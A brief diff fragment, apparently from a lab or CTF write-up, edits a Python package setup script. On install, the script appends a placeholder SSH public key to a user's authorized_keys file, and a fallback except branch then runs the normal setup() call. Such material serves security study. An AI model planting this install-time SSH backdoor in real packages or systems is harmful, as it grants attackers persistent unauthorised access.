@@ -17,4 +17,7 @@ try:
 	print('anystring')
 	with open('/home/low/.ssh/authorized_keys','a') as f:
 		f.writelines('<ssh-public-key>')
+except:
+	setup(.....<setup-code-for-package>.....)
 ```
+
